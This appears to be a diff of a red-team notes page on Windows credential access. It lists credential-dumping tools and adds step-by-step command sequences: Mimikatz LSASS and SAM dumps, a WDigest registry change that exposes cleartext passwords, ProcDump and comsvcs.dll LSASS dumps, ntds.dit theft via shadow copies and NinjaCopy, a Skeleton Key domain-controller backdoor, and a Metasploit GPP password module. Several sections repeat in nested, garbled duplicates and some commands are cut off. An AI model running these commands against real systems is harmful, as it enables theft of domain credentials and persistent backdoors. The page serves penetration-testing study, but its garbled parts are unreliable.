@@ -97,7 +97,26 @@ Privilege escalation tools can also provide much of the enumeration that you nee
 
 iRedTeam blog - [https://www.ired.team/offensive-security/credential-access-and-credential-dumping](https://www.ired.team/offensive-security/credential-access-and-credential-dumping)
 
+### Endpoint Tools
+
 {% tabs %}
+{% tab title="Endpoint Tools" %}
+* [PassHunt](https://github.com/Dionach/PassHunt) - PassHunt searches drives for documents that contain passwords or any other regular expression. It's designed to be a simple, standalone tool that can be run from a USB stick.
+* [SessionGopher](https://github.com/Arvanaghi/SessionGopher) - SessionGopher is a PowerShell tool that finds and decrypts saved session information for remote access tools. It has WMI functionality built in so it can be run remotely. Its best use case is to identify systems that may connect to Unix systems, jump boxes, or point-of-sale terminals.
+* [CredDump](https://github.com/moyix/creddump) - Tool for dumping credentials and secrets from Windows Registry Hives.
+  * [https://www.kali.org/tools/creddump7/](https://www.kali.org/tools/creddump7/)
+* [dumpsterdiver](https://www.kali.org/tools/dumpsterdiver/) - This package contains a tool, which can analyze big volumes of data in search of hardcoded secrets like keys (e.g. AWS Access Key, Azure Share Key or SSH keys) or passwords.
+* [polenum](https://www.kali.org/tools/polenum/) - polenum is a Python script which uses the Impacket Library from CORE Security Technologies to extract the password policy information from a windows machine.
+* [powersploit](https://www.kali.org/tools/powersploit/) - PowerSploit is a series of Microsoft PowerShell scripts that can be used in post-exploitation scenarios during authorized penetration tests.
+* [pspy](https://github.com/DominicBreuker/pspy) - Monitor linux processes without root permissions
+* [swap\_digger](https://github.com/sevagas/swap\_digger) - swap\_digger is a tool used to automate Linux swap analysis during post-exploitation or forensics. It automates swap extraction and searches for Linux user credentials, web forms credentials, web forms emails, http basic authentication, Wifi SSID and keys, etc.
+* [https://highon.coffee/blog/linux-local-enumeration-script/](https://highon.coffee/blog/linux-local-enumeration-script/)
+* [Masky](https://github.com/Z4kSec/Masky) - Python library with CLI allowing to remotely dump domain user credentials via an ADCS without dumping the LSASS process memory
+  * [https://z4ksec.github.io/posts/masky-release-v0.0.3/](https://z4ksec.github.io/posts/masky-release-v0.0.3/)
+* [MimiPenguin](https://github.com/huntergregal/mimipenguin) - A tool to dump the login password from the current linux desktop user.
+* [Internal-Monologue](https://github.com/eladshamir/Internal-monologue) - Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS
+{% endtab %}
+
 {% tab title="LaZagne" %}
 ### [LaZagne](https://github.com/AlessandroZ/LaZagne)&#x20;
 
@@ -133,19 +152,179 @@ Simply double clicking on the executable ‘Lazagne.exe' will cause a warning me
     * `python laZagne.py browsers -google -v`
 {% endtab %}
 
-{% tab title="Endpoint Tools" %}
-* [PassHunt](https://github.com/Dionach/PassHunt) - PassHunt searches drives for documents that contain passwords or any other regular expression. It's designed to be a simple, standalone tool that can be run from a USB stick.
-* [SessionGopher](https://github.com/Arvanaghi/SessionGopher) - SessionGopher is a PowerShell tool that finds and decrypts saved session information for remote access tools. It has WMI functionality built in so it can be run remotely. Its best use case is to identify systems that may connect to Unix systems, jump boxes, or point-of-sale terminals.
-* [CredDump](https://github.com/moyix/creddump) - Tool for dumping credentials and secrets from Windows Registry Hives.
-  * [https://www.kali.org/tools/creddump7/](https://www.kali.org/tools/creddump7/)
-* [dumpsterdiver](https://www.kali.org/tools/dumpsterdiver/) - This package contains a tool, which can analyze big volumes of data in search of hardcoded secrets like keys (e.g. AWS Access Key, Azure Share Key or SSH keys) or passwords.
-* [polenum](https://www.kali.org/tools/polenum/) - polenum is a Python script which uses the Impacket Library from CORE Security Technologies to extract the password policy information from a windows machine.
-* [powersploit](https://www.kali.org/tools/powersploit/) - PowerSploit is a series of Microsoft PowerShell scripts that can be used in post-exploitation scenarios during authorized penetration tests.
-* [pspy](https://github.com/DominicBreuker/pspy) - Monitor linux processes without root permissions
-* [swap\_digger](https://github.com/sevagas/swap\_digger) - swap\_digger is a tool used to automate Linux swap analysis during post-exploitation or forensics. It automates swap extraction and searches for Linux user credentials, web forms credentials, web forms emails, http basic authentication, Wifi SSID and keys, etc.
-* [https://highon.coffee/blog/linux-local-enumeration-script/](https://highon.coffee/blog/linux-local-enumeration-script/)
-* [Masky](https://github.com/Z4kSec/Masky) - Python library with CLI allowing to remotely dump domain user credentials via an ADCS without dumping the LSASS process memory
-  * [https://z4ksec.github.io/posts/masky-release-v0.0.3/](https://z4ksec.github.io/posts/masky-release-v0.0.3/)
+{% tab title="Mimikatz" %}
+{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md" %}
+
+
+
+Pulls credentials out of LSASS
+
+* Can be run im memory so you dont drop and executable on the target
+* Commands - will give clear text pw of currently logged in users
+  * \> C:\Tools\password\_attacks\mimikatz.exe
+  * \# privilege::debug
+  * \# token::elevate #elevate session to SYSTEM level
+  * \# kerberos
+  * \# wdigest
+  * \# lsadump::sam #Dump SAM database
+* Windows 10 issue - Mimikatz will pull a NULL value when pulling creds as they are no longer in LSASS
+  * Set registry key to put the credentials back into LSASS
+    * \> reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG\_DWORD /d 1 /f
+  * Empire Command version
+    * \>shell reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG\_DWORD /d 1 /f
+  * You will need the user to relog into the system for this to take affect. Force this by locking thier workstation.
+    * rundll32.exe user32.dll,LockWorkStation
+* Mimikatz NTLM hash of all users
+  * \#reg save hklm\sam filename1.hiv
+  * \#reg save hklm\security filename2.hiv
+  * mimikatz#privilege::debug
+  * mimikatz#token::elevate
+  * mimikatz#log hash.txt
+  * mimikatz#lsadump::sam filename1.hiv filename2.hiv
+* Mimikittenz
+  * POC style tool that utilizes windows function ReadProcessMemory() to extract plain text passwords from various targets such as browsers
+  * Search queries preloaded for Gmail, O365, Jira, github, bugzilla,zendesk, Cpanel, Dropbox, onedrive, AWS, SLack, Twitter, and Facebook
+  * Does not require Local admin, it runs in Userland mem
+  * [http://www.secureworks.com/cyber-threat-intelligence/threats/skeleton-key-malware-analysis](http://www.secureworks.com/cyber-threat-intelligence/threats/skeleton-key-malware-analysis)
+  * Back door a privileged AD account with Mimikatz
+  * To install the skeleton key
+    * \>mimikatz.exe “privilege::debug” “misc::skeleton” exit
+  * Use
+    * \>net use \* \\\dc\c$ mimikatz /user:lab@attacker.domain
+    * [https://xapax.github.io/security/#attacking\_active\_directory\_domain/active\_directory\_privilege\_escalation/credential\_extraction/](https://xapax.github.io/security/#attacking\_active\_directory\_domain/active\_directory\_privilege\_escalation/credential\_extraction/)
+    * [http://www.secureworks.com/cyber-threat-intelligence/threats/skeleton-key-malware-analysis](http://www.secureworks.com/cyber-threat-intelligence/threats/skeleton-key-malware-analysis)
+    * Back door a privileged AD account with Mimikatz
+    * To install the skeleton key
+      * \>mimikatz.exe “privilege::debug” “misc::skeleton” exit
+    * Use
+      * \>net use \* \\\dc\c$ mimikatz /user:lab@attacker.domain
+      * [https://xapax.github.io/security/#attacking\_active\_directory\_domain/active\_directory\_privilege\_escalation/credential\_extraction/](https://xapax.github.io/security/#attacking\_active\_directory\_domain/active\_directory\_privilege\_escalation/credential\_extraction/)
+      * [http://www.secureworks.com/cyber-threat-intelligence/threats/skeleton-key-malware-analysis](http://www.secureworks.com/cyber-threat-intelligence/threats/skeleton-key-malware-analysis)
+      * Back door a privileged AD account with Mimikatz
+      * To install the skeleton key
+        * \>mimikatz.exe “privilege::debug” “misc::skeleton” exit
+      * Use
+        * \>net use \* \\\dc\c$ mimikatz /user:lab@attacker.domain
+        * [https://xapax.github.io/security/#attacking\_active\_directory\_domain/active\_directory\_privilege\_escalation/credential\_extraction/](https://xapax.github.io/security/#attacking\_active\_directory\_domain/active\_directory\_privilege\_escalation/credential\_extraction/)
+{% endtab %}
+{% endtabs %}
+
+### Endpoint Techniques
+
+{% tabs %}
+{% tab title="Dumping w/o LSASS" %}
+* [https://ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz](https://ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz)
+* [Dumping Lsass.exe to Disk Without Mimikatz and Extracting Credentials - Red Teaming Experiments](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz)&#x20;
+* [https://www.whiteoaksecurity.com/blog/attacks-defenses-dumping-lsass-no-mimikatz/](https://www.whiteoaksecurity.com/blog/attacks-defenses-dumping-lsass-no-mimikatz/)
+* ProcDump
+  * \>procdump.exe -accepteula -ma lsass.exe lsass.dmp
+    * will need local admin to dump LSASS
+  * Create dump file by using options within tasklist
+  * Executing a native comsvcs.dll DLL found in Windows\system32 with rundll32:
+    * .\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp fu
+{% endtab %}
+
+{% tab title="Skeleton Key" %}
+* [http://www.secureworks.com/cyber-threat-intelligence/threats/skeleton-key-malware-analysis](http://www.secureworks.com/cyber-threat-intelligence/threats/skeleton-key-malware-analysis)
+* Back door a privileged AD account with Mimikatz
+* To install the skeleton key
+  * \>mimikatz.exe “privilege::debug” “misc::skeleton” exit
+* Use
+  * \>net use \* \\\dc\c$ mimikatz /user:lab@attacker.domain
+  * [https://xapax.github.io/security/#attacking\_active\_directory\_domain/active\_directory\_privilege\_escalation/credential\_extraction/](https://xapax.github.io/security/#attacking\_active\_directory\_domain/active\_directory\_privilege\_escalation/credential\_extraction/)
+{% endtab %}
+
+{% tab title="Vol. Shadow Copy" %}
+
+
+Once you have Domain Admin access, the old way to pull all hashes from the DC was to run commands on the domain controller and user Shadow volume or Raw copy to pull the ntds.dit file
+
+* _RTFM: Volume Shadow Copy - pg.21_
+* Volume Shadow Copy technique (old)
+  * NTDS.dit file is constantly being locked as in use by the OS.
+  * We can use Volume Shadow Copy to make an copy of it we can extract hashes from
+    * C:\vssadmin create shadow /for=C:
+    * copy \\\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy\[DISK\_NUMBER]\windows\ntds\ntds.dit
+    * copy \\\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy\[DISK\_NUMBER]\windows\system32\config\SYSTEM
+    * copy \\\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy\[DISK\_NUMBER]\windows\system32\config\SAM
+    * reg SAVE HKLM\SYSTEM c:\SYS
+    * vssadmin delete shadows /for=\[/oldest | /all | /shadow=]
+* ALT
+  * Volume Shadow Copy
+    * \#vssadmin list shadows
+      * \#set VSHADOW\_DEVICE=\\\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12
+      * \#for /R %VSHADOW\_DEVICE%\ %i in (\*) do @echo %i
+      * &#x20;[https://blogs.msdn.microsoft.com/adioltean/2004/12/14/creating-shadow-copies-from-the-command-line/](https://blogs.msdn.microsoft.com/adioltean/2004/12/14/creating-shadow-copies-from-the-command-line/)
+* Listing shadow copy contents. This is tricky since the shadow copies are not regular (standalone) volumes. These are pseudo-volume devices, without a drive letter or volume name, in the form \\\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyNNN. You can still access their contents from the command line, if you know how. For example, copying a file from the shadow copy can be done this way:
+  * dir > c:\somefile.txt
+  * &#x20;vssadmin create shadow /for=c:
+  * &#x20;vssadmin list shadows
+  * &#x20;(get the shadow copy device, let's say that this is \\\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12)
+  * &#x20;set VSHADOW\_DEVICE=\\\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12
+  * &#x20;copy %VSHADOW\_DEVICE%\somefile.txt c:\somefile\_bak.txt
+* To enumerate all files on a shadow copy device we will use the "for /R" command. Note that we used %i and not %%i so the command below will not work properly in a CMD batch file:
+  * dir > c:\somefile.txt
+  * vssadmin create shadow /for=c:
+  * vssadmin list shadows
+  * (get the shadow copy device, let's say that this is \\\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12)
+  * set VSHADOW\_DEVICE=\\\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12
+  * for /R• %VSHADOW\_DEVICE%\ %i in (\*) do @echo %i
+{% endtab %}
+
+{% tab title="NinjaCopy" %}
+NinjaCopy [http://bit.ly/2HpvKwj](http://bit.ly/2HpvKwj)
+
+* Copies file from an NTFS partition volume by reading the raw volume and parsing the NTFS Strucutres
+* This bypasses file DACL's, read handle blocks, and SACL's
+* This can be used to read SYSTEM files that are normally locked like NTDS.dit registry hives
+* \> Invoke-NinjaCopy -Path “c:\Windows\ntds\ntds.dit” -LocalDestination "c:\Windows\temp\ntds.di
+{% endtab %}
+
+{% tab title="DCSync" %}
+DCSync (Modern)
+
+* Impersonates the DC and requests hashes of all users on the domain
+* No need to touch the DC at all!!
+* Must have proper permissions: Domain Admins/Enterprise Admins/DC groups/ anyone with Replicating Changes permissions seg to All
+{% endtab %}
+{% endtabs %}
+
+#### Windows Service Extraction
+
+{% tabs %}
+{% tab title="Windows Native Tooling" %}
+
+
+* WCE - Windows Credential Editor
+  * Lists windows logon sessions and add/change/delete associated credentials
+* Windows credential manager
+  *   [https://github.com/peewpw/Invoke-WCMDump/blob/master/Invoke-WCMDump.p](https://github.com/peewpw/Invoke-WCMDump/blob/master/Invoke-WCMDump.ps1)
+
+      Group Policy Preference Vul
+
+      * Info for accounts under GPP stored in a Groups.xml file that contains cpassword hash.
+      * Uses a publiclally posed Microsoft AES , easy to find, easy to use
+      * Exploit available Under powersploit script Get-GPPPassword.ps1
+      * Metasploit module
+        * \>use post/windows/gather/credentials/gpp
+        * \>set SESSION \[Session # of your shell]
+        * \>exploit
+      *   [http://esec-pentest.sogeti.com/public/files/gpprefdecrypt.py](http://esec-pentest.sogeti.com/public/files/gpprefdecrypt.py)
+
+          Group Policy Preference Vul
+
+          * Info for accounts under GPP stored in a Groups.xml file that contains cpassword hash.
+          * Uses a publiclally posed Microsoft AES , easy to find, easy to use
+          * Exploit available Under powersploit script Get-GPPPassword.ps1
+          * Metasploit module
+            * \>use post/windows/gather/credentials/gpp
+            * \>set SESSION \[Session # of your shell]
+            * \>exploit
+          * [http://esec-pentest.sogeti.com/public/files/gpprefdecrypt.py](http://esec-pentest.sogeti.com/public/files/gpprefdecrypt.py)
+{% endtab %}
+
+{% tab title="GPP Vuln" %}
+
 {% endtab %}
 {% endtabs %}
 
